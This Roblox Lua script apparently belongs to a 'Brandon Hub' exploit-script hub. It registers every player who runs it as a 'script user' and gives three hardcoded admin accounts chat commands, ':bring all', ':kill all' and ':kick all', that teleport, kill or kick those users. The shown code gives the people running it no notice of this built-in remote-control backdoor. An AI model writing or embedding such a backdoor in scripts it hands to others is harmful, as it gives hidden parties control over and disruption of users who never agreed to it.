local Players = game:GetService("Players")
local AdminNames = {"MaybeFlashh", "ikbengoerge99", "KMONEYBROWN144"}
local ScriptUsers = {}
local Loaded = false

local function isAdmin(player)
    if not player then return false end
    for _, name in ipairs(AdminNames) do
        if player.Name == name then
            return true
        end
    end
    return false
end

local function isScriptUser(player)
    if not player then return false end
    return ScriptUsers[player.UserId] == true
end

local function bringAll(admin)
    if not admin or not admin.Character then return end
    local adminHRP = admin.Character:FindFirstChild("HumanoidRootPart")
    if not adminHRP then return end
    
    for _, player in ipairs(Players:GetPlayers()) do
        if player and isScriptUser(player) and not isAdmin(player) and player.Character then
            local hrp = player.Character:FindFirstChild("HumanoidRootPart")
            if hrp then
                hrp.CFrame = adminHRP.CFrame + Vector3.new(0, 3, 0)
            end
        end
    end
end

local function killAll(admin)
    for _, player in ipairs(Players:GetPlayers()) do
        if player and isScriptUser(player) and not isAdmin(player) and player.Character then
            local humanoid = player.Character:FindFirstChild("Humanoid")
            if humanoid then
                humanoid.Health = 0
            end
        end
    end
end

local function kickAll(admin)
    for _, player in ipairs(Players:GetPlayers()) do
        if player and isScriptUser(player) and not isAdmin(player) then
            player:Kick("Kicked by Brandon Hub Admin")
        end
    end
end

local function setupChatListener(player)
    if not player then return end
    player.Chatted:Connect(function(message)
        if isAdmin(player) then
            if message == ":bring all" then
                bringAll(player)
            elseif message == ":kill all" then
                killAll(player)
            elseif message == ":kick all" then
                kickAll(player)
            end
        end
    end)
end

local executor = Players.LocalPlayer
if executor and not isAdmin(executor) then
    ScriptUsers[executor.UserId] = true
end

for _, player in ipairs(Players:GetPlayers()) do
    setupChatListener(player)
end

Players.PlayerAdded:Connect(function(newPlayer)
    setupChatListener(newPlayer)
end)

Players.PlayerRemoving:Connect(function(player)
    if player then
        ScriptUsers[player.UserId] = nil
    end
end)

coroutine.wrap(function()
    while true do
        wait(5)
        for _, player in ipairs(Players:GetPlayers()) do
            if player and isScriptUser(player) and isAdmin(player) then
                ScriptUsers[player.UserId] = nil
            end
        end
    end
end)()

Loaded = true
